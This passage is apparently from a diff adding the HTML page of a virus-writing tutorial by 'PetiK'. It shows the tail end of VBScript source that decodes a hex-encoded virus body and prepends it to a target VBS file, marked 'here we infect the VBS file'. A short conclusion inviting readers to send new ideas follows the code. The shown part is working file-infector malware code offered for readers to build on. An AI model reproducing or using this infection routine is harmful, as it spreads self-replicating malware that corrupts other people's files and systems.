+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;vbsorg = cot.ReadAll()</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;cot.Close</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>----------- here we infect the VBS file -----------</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;For Y=1 To Len(vbshex) Step 2</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;virvbs = virvbs &amp; Chr(&quot;&amp;H&quot; &amp; Mid(vbshex,Y,2))</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;Next</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;Set inf = fso.OpenTextFile(f1.Path, 2, True)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;inf.Write virvbs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' write virus code</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;inf.WriteLine &quot;&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;inf.WriteLine (vbsorg)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' write real code</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;inf.Close</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>----------- here we infect the VBS file -----------</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B> &nbsp;&nbsp;&nbsp;End If</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<bR>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>###################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B># V: CONCLUSION : #</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>###################</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>This is the end of the article. If you have some suggestions or new ideas, please mail me to </B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>petikvx@aol.fr.</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</B><FONT  COLOR="#DDDDDD"><B>PetiK/[b8] (www.petikvx.fr.fm)</B></FONT>
+</FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+</Td>
+<Td ALIGN="LEFT" WIDTH="10" VALIGN = "top" ><IMG BORDER="0" SRC="1x1.gif" HEIGHT="1" ALIGN="bottom" WIDTH="10" HSPACE="0" VSPACE="0"></Td>
+ </Tr>
+ <Tr>
+  <Td WIDTH="10" HEIGHT="1"></Td>  <Td><FONT SIZE="1"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</FONT></Td>  <Td WIDTH="10" ></Td>
+ </Tr>
+</TABLE>
+</BODY>
+</HTML>
